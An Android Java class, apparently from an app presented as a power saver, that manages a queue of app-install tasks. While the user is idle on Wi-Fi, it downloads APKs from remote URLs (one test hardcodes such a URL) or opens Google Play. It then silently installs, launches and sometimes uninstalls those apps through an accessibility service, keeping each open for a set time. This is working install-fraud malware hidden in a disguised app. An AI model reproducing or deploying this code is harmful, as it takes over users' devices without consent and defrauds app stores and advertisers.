package com.luna.powersaver.gp.manager;

import android.os.Handler;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.entity.JsonAppInfo;
import com.luna.powersaver.gp.http.DownloadManager;
import com.luna.powersaver.gp.http.bean.DownloadInfo;
import com.luna.powersaver.gp.service.NBAccessibilityService;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppUtil;
import com.luna.powersaver.gp.utils.FileUtil;
import com.luna.powersaver.gp.utils.JsonUtil;
import com.luna.powersaver.gp.utils.NetworkUtil;

import org.json.JSONArray;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 为了操作方便，暂时实行同一时间一个任务 <br />
 * 此处工作基本都在线程执行 <br />
 * Created by zsigui on 17-1-18.
 */

public class StalkerManager implements DownloadInfo.DownloadListener {

    private static StalkerManager sInstance;

    public static StalkerManager get() {
        if (sInstance == null) {
            sInstance = new StalkerManager();
        }
        return sInstance;
    }

    private static final String FILE_TOTAL_NAME = "all";
    private static final String FILE_KEY_NAME = "k";
    /**
     * 默认监测用户无操作间隔，5分钟，单位 ms
     */
    private static final int DEFAULT_SPY_DIFF_TIME = 10 * 1000;
    /**
     * 默认至少需要打开的时间，单位 s
     */
    private static final int DEFAULT_OPEN_TIME = 5 * 60;
    private boolean mIsInSpying = false;
    /**
     * 当前正在执行的任务
     */
    public JsonAppInfo pCurrentWorkInfo;
    // 全部任务列表
    private HashMap<String, JsonAppInfo> mTotalMap = null;
    private ArrayList<JsonAppInfo> mWaitingList = null;

    public void test() {
//        DownloadInfo info = new DownloadInfo();
//        info.setDestUrl("http://static.amigo.ws/apk/release_241.apk");
//        info.setDownloadUrl("http://static.amigo.ws/apk/release_241.apk");
//        info.setPackageName("luna.net.shortfilm.gp");
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加测试成功!");
        JsonAppInfo i = new JsonAppInfo();
        i.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
        i.start = 1;
        i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net.shortfilm.gp;end";
        i.url = "http://static.amigo.ws/apk/release_241.apk";
        i.task = JsonAppInfo.TASK.DOWNLOAD_BY_APK;
        i.pkg = "luna.net.shortfilm.gp";
        i.starttime = System.currentTimeMillis() / 1000 - 10;
        i.endtime = System.currentTimeMillis() / 1000 + 30 * 60;
        i.keepstate = JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN;
        ArrayList<JsonAppInfo> is = new ArrayList<>();
        is.add(i);
        addNewTask(is);

    }

    private void printJsonAppInfo(JsonAppInfo info) {
        AppDebugLog.d(AppDebugLog.TAG_PRINT, "当前执行的任务: " + JsonUtil.convertJsonAppInfoToJson(info));
    }

    private void printJsonAppInfoMap(HashMap<String, JsonAppInfo> map) {
        AppDebugLog.d(AppDebugLog.TAG_PRINT, "当前总的任务：" + JsonUtil.convertJsonAppInfoMapToJson(map));
    }

    private void printJsonAppInfoList(ArrayList<JsonAppInfo> list) {
        if (list != null) {
            JSONArray jsonArray = new JSONArray();
            for (JsonAppInfo entry : list) {
                jsonArray.put(JsonUtil.convertJsonAppInfoToJObj(entry));
            }
            AppDebugLog.d(AppDebugLog.TAG_PRINT, "待执行任务列表：" + jsonArray.toString());

        } else {
            AppDebugLog.d(AppDebugLog.TAG_PRINT, "list is null");
        }
    }

    /**
     * 移除废除的任务，建议线程中执行
     */
    public void removeOldTask(String oldpkgs) {
        if (TextUtils.isEmpty(oldpkgs)) {
            return;
        }
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        String[] oldpkgArr = oldpkgs.split("|");
        JsonAppInfo tmp;
        for (String pkg : oldpkgArr) {
            if (TextUtils.isEmpty(pkg))
                continue;

            if (pCurrentWorkInfo != null && pCurrentWorkInfo.pkg.equals(pkg)) {
                // 当前任务需要废除
                pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DISCARD;
                pCurrentWorkInfo = null;
            }
            Iterator<JsonAppInfo> it = mWaitingList.iterator();
            while (it.hasNext()) {
                tmp = it.next();
                if (tmp != null && pkg.equals(tmp.pkg)) {
                    it.remove();
                }
            }
        }
    }

    /**
     * 判断并添加新增的任务，建议线程中执行
     */
    public void addNewTask(ArrayList<JsonAppInfo> newpkgs) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务： " + newpkgs);
        if (mWaitingList == null || mTotalMap == null) {
            restoreCurrentTask();
        }
        JsonAppInfo old;
        for (JsonAppInfo info : newpkgs) {
            if (info == null)
                continue;
            old = mTotalMap.get(info.pkg);
            if (old == null) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务： " + info.pkg);
                mWaitingList.add(info);
                mTotalMap.put(info.pkg, info);
            } else {
                if ((old.execstate != JsonAppInfo.EXC_STATE.FINISHED
                        && old.execstate != JsonAppInfo.EXC_STATE.DISCARD)
                        || (old.starttime < info.starttime)) {
                    AppDebugLog.d(AppDebugLog.TAG_STALKER, "重置旧的任务：" + info.pkg);
                    // 任务没完成或者需要重置
                    old.starttime = info.starttime;
                    old.endtime = info.endtime;
                    old.task = info.task;
                    old.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
                    for (JsonAppInfo tp : mWaitingList) {
                        if (tp.pkg.equals(old.pkg)) {
                            return;
                        }
                    }
                    mWaitingList.add(old);
                }
            }
        }
    }

    private Handler mHandler = new Handler(Looper.getMainLooper());
    private Runnable run = new Runnable() {
        @Override
        public void run() {
            if (mTotalMap == null) {
                restoreCurrentTask();
            }
            if (NetworkUtil.isWifiConnected(StaticConst.sContext)) {
                NBAccessibilityService.sIsInWork = true;
//                screenWakeup();
                doStart();
            } else {
                stopSpyWork();
            }
        }
    };

    /**
     * 开启监视弹窗，然后执行任务的过程
     */
    public void startSpyWork() {
        if (mIsInSpying)
            return;
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "开始执行监视任务!");
        mIsInSpying = true;
        mHandler.removeCallbacks(run);
        mHandler.postDelayed(run, DEFAULT_SPY_DIFF_TIME);
    }


    public void stopSpyWork() {
        mIsInSpying = false;
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "取消执行监视任务!");
//        screenLock();
        mHandler.removeCallbacksAndMessages(run);
        // 保存当前任务状态
        StalkerManager.get().saveCurrentTask();
        mTotalMap = null;
        mWaitingList = null;
        pCurrentWorkInfo = null;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.CLEAR;
        ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
    }

    /**
     * 实际开始执行任务，
     */
    public void doStart() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doStart执行!");
        if (!NBAccessibilityService.sIsInWork) {
            return;
        }
        NBAccessibilityService.sRetryTime = 0;

        if (mTotalMap == null || mWaitingList == null)
            restoreCurrentTask();

        printJsonAppInfoList(mWaitingList);
        if (pCurrentWorkInfo != null)
            // 确保一致
            pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);

        if (pCurrentWorkInfo == null || pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.DISCARD
                || pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
            // 处理 pCurrentWorkInfo
            JsonAppInfo info = null;
            Iterator<JsonAppInfo> iterator = mWaitingList.iterator();
            long curTime = System.currentTimeMillis() / 1000;
            while (iterator.hasNext()) {
                info = iterator.next();
                if (info == null) {
                    iterator.remove();
                } else if (curTime >= info.endtime
                        || info.execstate == JsonAppInfo.EXC_STATE.DISCARD
                        || info.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
                    // 已经超时，任务废弃
                    iterator.remove();
                    info.execstate = JsonAppInfo.EXC_STATE.DISCARD;
                } else if (curTime > info.starttime) {
                    // 正常可执行任务
                    break;
                }
                info = null;
            }
            if (info == null) {
                // 没有任务或者没有合适的任务，此次执行提前结束
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "没有任务或者没有合适的任务，此次执行提前结束");
                stopSpyWork();
                return;
            }

            pCurrentWorkInfo = info;
        }

        if (pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD
                && AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
            // 要进行的任务已经安装，所以直接修改状态
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.INSTALLED;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "任务当前状态为：" + pCurrentWorkInfo.execstate);
        printJsonAppInfo(pCurrentWorkInfo);
        // 之前执行任务重启判断
        switch (pCurrentWorkInfo.execstate) {
            case JsonAppInfo.EXC_STATE.DOWNLOADED:
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    doContinueAfterDownloaded(info);
                    return;
                }
                break;
            case JsonAppInfo.EXC_STATE.INSTALLED:
                doContinueAfterInstalled();
                return;
            case JsonAppInfo.EXC_STATE.OPENED:
                doContinueAfterOpened();
                return;
            case JsonAppInfo.EXC_STATE.FINISHED:
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "当前任务已经完成，重新执行下一个任务!");
                doNextStart();
                return;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行当前任务，pCurrentWorkInfo = " + pCurrentWorkInfo.pkg);

        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DOWNLOADING;
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
            // 开始下载
            DownloadInfo downloadInfo = new DownloadInfo();
            downloadInfo.setDownloadUrl(pCurrentWorkInfo.url);
            downloadInfo.setDestUrl(pCurrentWorkInfo.url);
            downloadInfo.setPackageName(pCurrentWorkInfo.pkg);
            DownloadManager.getInstance(StaticConst.sContext).startDownload(downloadInfo);
            // 需要等下载完之后回调
        } else if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_GP) {
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
            if (!AppUtil.jumpToStore(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                // 上报由于不存在GP而失败
                doNextStartAfterError(0, "GP没有安装失败");
            }
        }
    }

    /**
     * 卸载完成后执行下一个任务
     */
    public void doContinueAfterUninstall() {
        // 卸载之后，则开始执行下一个任务
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterUninstall");
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.FINISHED;
            pCurrentWorkInfo = null;
        }
        doStart();
    }

    /**
     * 当APP检测已经安装，执行该步骤
     */
    public void doContinueAfterInstalled() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterInstalled");
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterInstalled：当前状态 = " + pCurrentWorkInfo.execstate);
//        if (pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.INSTALLED) {
//            return;
//        }
        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.INSTALLED;
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                doNextStart();
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                }
                // 安装后不打开立即卸载
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                judgeOpen();
                break;
        }
    }

    /**
     * 处理APP打开过后的操作（根据累计时间继续打开或者下载完成等）
     */
    public void doContinueAfterOpened() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterOpened");
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
//        if (pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.INSTALLED
//                && pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.OPENED) {
//            return;
//        }
        ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.OPENED;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        NBAccessibilityService.sCurrentWorkState = 0;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 一般该状态到不了这里
                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(pCurrentWorkInfo.pkg);
                    info.setDownloadUrl(pCurrentWorkInfo.url);
                    info.setDestUrl(pCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                doNextStart();
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 一般该状态到不了这里
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                    doNextStart();
                }
                break;
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (isFinishedOpen()) {
                    doNextStart();
                } else {
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                    judgeOpen();
                }
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
                if (isFinishedOpen()) {
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                    AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                } else {
                    judgeOpen();
                }
                break;
        }
    }

    /**
     * 判断开启应用，并进行打开计时
     */
    private void judgeOpen() {
        if (NBAccessibilityService.sIsInWork) {
            if (!AppUtil.isPkgForeground(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
                AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo);
                // 开启后台计时服务
                if (pCurrentWorkInfo.start != 0) {
                    pCurrentWorkInfo.opentime = DEFAULT_OPEN_TIME;
                    doContinueAfterOpened();
                } else {
                    ClockManager.get().startOpenRecordAlarm(StaticConst.sContext);
                }
            }
        }
    }

    /**
     * 下载完成后处理，由于通过GP会直接跳转安装完成，则GP下载该步是忽略的
     *
     * @param info
     */
    public void doContinueAfterDownloaded(DownloadInfo info) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterDownloaded");
        if (pCurrentWorkInfo == null) {
            doStart();
            return;
        }
        NBAccessibilityService.sCurrentWorkState = 0;
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        switch (pCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 删除包，然后不做其他操作
//                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                doNextStart();
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 安装后不打开立即卸载
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "判断执行安装操作!");
                NBAccessibilityService.sCurrentWorkState = 0;
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppUtil.install(StaticConst.sContext,
                            DownloadManager.getInstance(StaticConst.sContext).getDownloadFile(info));
                }
                break;
        }
    }

    public void doContinueAfterSearch() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterSearch");
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
        NBAccessibilityService.sCurrentWorkState = 0;
    }

    public void doNextStart() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doNextStart");
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.FINISHED;
        }
        pCurrentWorkInfo = null;
        saveCurrentTask();
        doStart();
    }

    public void doNextStartAfterError(int code, String msg) {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doNextStartAfterError: " + msg);
        if (pCurrentWorkInfo != null) {
            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DISCARD;
        }
        pCurrentWorkInfo = null;
        saveCurrentTask();
        doStart();
    }

    @Override
    public void onProgressUpdate(DownloadInfo info, int elapsedTime) {

    }

    @Override
    public void onFinishDownload(DownloadInfo info) {
        doContinueAfterDownloaded(info);
    }

    @Override
    public void onFailDownload(DownloadInfo info, String err) {
        // 下载失败，废弃
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "下载失败: " + info.getPackageName() + ", url = "
                + info.getDownloadUrl() + ", err = " + err);
        doNextStartAfterError(0, "APK下载失败");
    }

    @Nullable
    private File getOrMkStoreDir() {
        File storeDir = FileUtil.getOwnCacheDirectory(StaticConst.sContext, StaticConst.STORE_DATA);
        if (!storeDir.exists() || !storeDir.isDirectory()) {
            boolean isSuccess = storeDir.mkdirs();
            if (!isSuccess) {
                AppDebugLog.d(AppDebugLog.TAG_STALKER, "创建文件夹失败: " + storeDir.getAbsolutePath());
                return null;
            }
        }
        return storeDir;
    }

    /**
     * 保存任务状态，建议在线程中执行
     */
    public void saveCurrentTask() {
        if (mTotalMap == null || mWaitingList == null)
            return;
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "进行任务状态保护!");
        File storeDir = getOrMkStoreDir();
        if (storeDir == null) return;
        truncateTotalMap();
        printJsonAppInfoMap(mTotalMap);
        String json = JsonUtil.convertJsonAppInfoMapToJson(mTotalMap);
        FileUtil.writeData(new File(storeDir, FILE_TOTAL_NAME), json);
        json = JsonUtil.convertJsonAppInfoToJson(pCurrentWorkInfo);
        FileUtil.writeData(new File(storeDir, FILE_KEY_NAME), json);
    }

    /**
     * 提取任务状态，建议在线程中执行
     */
    public void restoreCurrentTask() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "获取保存的任务状态!");
        File tmpFile = getOrMkStoreDir();
        if (tmpFile != null) {
            tmpFile = new File(tmpFile, FILE_TOTAL_NAME);
            String json;
            if (tmpFile.exists()) {
                json = FileUtil.readData(tmpFile);
                mTotalMap = JsonUtil.convertJsonStringToJsonAppInfoMap(json);
            }
            tmpFile = new File(tmpFile, FILE_KEY_NAME);
            if (tmpFile.exists()) {
                json = FileUtil.readData(tmpFile);
                pCurrentWorkInfo = JsonUtil.convertJsonToJsonAppInfo(json);
            }
        }
        mTotalMap = (mTotalMap == null ? new HashMap<String, JsonAppInfo>() : mTotalMap);
        if (mWaitingList == null) {
            mWaitingList = new ArrayList<>();
        } else {
            mWaitingList.clear();
        }
        if (mTotalMap != null) {
            if (pCurrentWorkInfo != null) {
                pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);
            }
            for (JsonAppInfo info : mTotalMap.values()) {
                if (info.execstate != JsonAppInfo.EXC_STATE.FINISHED
                        && info.execstate != JsonAppInfo.EXC_STATE.DISCARD) {
                    mWaitingList.add(info);
                }
            }
        }
        printJsonAppInfo(pCurrentWorkInfo);
        printJsonAppInfoMap(mTotalMap);
        printJsonAppInfoList(mWaitingList);
    }


    /**
     * 缩减数据，将废弃或者已经完成的过期的数据删除
     */
    private void truncateTotalMap() {
        int size = mTotalMap.size();
        if (size > 200) {
            // 尽量削减，最多一半
            Iterator<JsonAppInfo> it = mTotalMap.values().iterator();
            JsonAppInfo tmp;
            while (it.hasNext()) {
                tmp = it.next();
                if (tmp == null || tmp.execstate == JsonAppInfo.EXC_STATE.DISCARD) {
                    it.remove();
                    size--;
                }
                if (size <= 100) {
                    break;
                }
            }
            if (size > 200) {
                it = mTotalMap.values().iterator();
                long curTime = System.currentTimeMillis();
                while (it.hasNext()) {
                    tmp = it.next();
                    if (tmp == null || tmp.execstate == JsonAppInfo.EXC_STATE.FINISHED
                            && tmp.endtime < curTime) {
                        it.remove();
                        size--;
                    }
                    if (size <= 100) {
                        break;
                    }
                }
            }
        }
    }

    public boolean isFinishedOpen() {
        return pCurrentWorkInfo != null && pCurrentWorkInfo.opentime >= DEFAULT_OPEN_TIME;
    }

    public void judgeClearList() {
        AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行清洁保存任务：" + NBAccessibilityService.sIsInWork);
        if (!NBAccessibilityService.sIsInWork) {
            StalkerManager.get().saveCurrentTask();
            pCurrentWorkInfo = null;
            mTotalMap = null;
            mWaitingList = null;
        }
    }

//
//    private PowerManager.WakeLock mWakeLock;
//
//    public void screenWakeup() {
//        if (mWakeLock == null) {
//            PowerManager pm = (PowerManager) StaticConst.sContext.getSystemService(Context.POWER_SERVICE);
//            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "test");
//            mWakeLock.acquire();
//        }
//    }
//
//    public void screenLock() {
//        if (mWakeLock != null) {
//            mWakeLock.release();
//            mWakeLock = null;
//        }
//    }

}
